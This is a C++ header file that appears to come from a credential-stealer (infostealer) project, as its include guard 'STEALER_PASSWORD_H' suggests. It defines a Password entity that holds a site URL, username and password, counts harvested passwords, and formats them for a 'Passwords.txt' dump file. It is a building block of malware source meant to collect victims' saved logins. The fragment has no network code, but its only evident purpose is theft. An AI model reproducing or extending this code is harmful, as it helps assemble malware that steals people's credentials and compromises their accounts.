//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_PASSWORD_H
#define STEALER_PASSWORD_H

#include "../Includes.h"
#include "Entity.h"

struct Password : public Entity {
    std::string origin;
    std::string username;
    std::string password;

    bool canBeWrite() override {
        return !(password.empty() && username.empty());
    }

    std::string toString() override {
        Counter::increasePasswords();
        return  "Url: " + this->origin + "\n" +
                "  Username: " + this->username + "\n" +
                "  Password: " + this->password;
    }

    std::string getFileName() override {
        return "Passwords.txt";
    }
};

#endif //STEALER_PASSWORD_H
